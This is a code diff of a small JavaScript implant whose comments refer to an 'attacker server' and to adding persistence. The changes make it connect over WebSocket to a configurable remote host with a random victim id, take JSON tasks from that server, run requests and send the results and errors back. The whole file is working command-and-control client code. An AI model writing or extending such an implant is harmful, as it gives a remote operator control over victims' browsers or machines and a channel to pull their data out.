@@ -1,10 +1,16 @@
 (() => { // Don't pollute global namespace
+    console.log('stuff')
+    const config = require('../config')
+
     // TODO implement persistence
 
     (() => {
+        console.log('loaded')
+
         // TODO build file using a config containing the attacker server
-        // TODO randomly choose an id
-        const ws = new WebSocket('ws://localhost:8080/ws/12345')
+        const id = Math.floor(Math.random() * (2 ** 32))
+        const ws_url = 'ws://' + config.url + ':' + config.port + config.wspath + '/' + id
+        const ws = new WebSocket(ws_url)
 
         ws.onmessage = (msg) => {
             const msgobj = JSON.parse(msg.data)
@@ -16,9 +22,9 @@
                 .then(restext => {
                     ws.send(JSON.stringify(restext))
                 })
-                .catch(err => null) // Silently error TODO send error back to server
+                .catch(err => ws.send(err))
             })
-            .catch(err => null) // Silently error TODO send error back to server
+            .catch(err => ws.send(err))
         }
     })()
 })()
